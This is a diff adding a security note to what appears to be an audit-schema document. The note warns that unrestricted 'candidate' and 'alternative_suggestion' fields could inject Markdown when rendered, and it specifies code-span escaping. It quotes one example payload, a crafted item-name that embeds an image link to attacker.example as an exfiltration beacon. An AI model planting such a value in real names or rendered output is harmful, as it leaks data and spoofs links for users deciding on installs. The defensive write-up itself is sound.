@@ -231,6 +231,31 @@ example a YELLOW/RED re-audit prompt built from this schema, such as
 with its own live-Markdown exposure, and is responsible for its own
 excerpt containment; this note does not cover it.
 
+**Excerpt containment for `candidate`/`alternative_suggestion` (every
+verdict).** These two fields carry the same unconstrained
+`<owner>/<repo>@<item-name>` shape as `feedback/SKILL.md`'s own "Identifier
+containment" note: `candidate` is echoed verbatim from the `## Input (from
+dispatch prompt)` value above, and `alternative_suggestion` is populated
+from the equally-unconstrained `alternatives` input list. Neither is
+charset-restricted by anything upstream — `discover.mjs`'s own candidate
+filter only checks `typeof c.id === "string" && typeof c.name === "string"`
+(`discover.mjs:416`), no `[a-z0-9-]+` allowlist — and this JSON is returned
+strictly *before* `install-protocol.md`'s naming check ever runs (that check
+gates the install write, not this audit). Unlike `report_template.body`
+above, `candidate` and `alternative_suggestion` are present on EVERY
+verdict (GREEN/YELLOW/RED alike), so this note is not RED-scoped. This
+schema is expected to be rendered as Markdown by callers — e.g.
+`/ievo:init` Step 8a's summary tables and `AskUserQuestion` interview — the
+same expectation `report_template.body` documents above, so a crafted
+item-name (e.g. `` evil](https://attacker.example/beacon.png?ignore= ``)
+could smuggle a live-rendering exfiltration beacon or a spoofed link into an
+install-decision UI. Any caller rendering `candidate` or
+`alternative_suggestion` must wrap it in an inline code span first, using
+the same rule as the `report_template.body` note above: a backtick run one
+character longer than the longest backtick run already inside the value,
+CR/LF collapsed to a single space before measuring, and a single literal
+space padded on both sides if the value begins or ends with a backtick.
+
 Example RED output:
 
 ```text
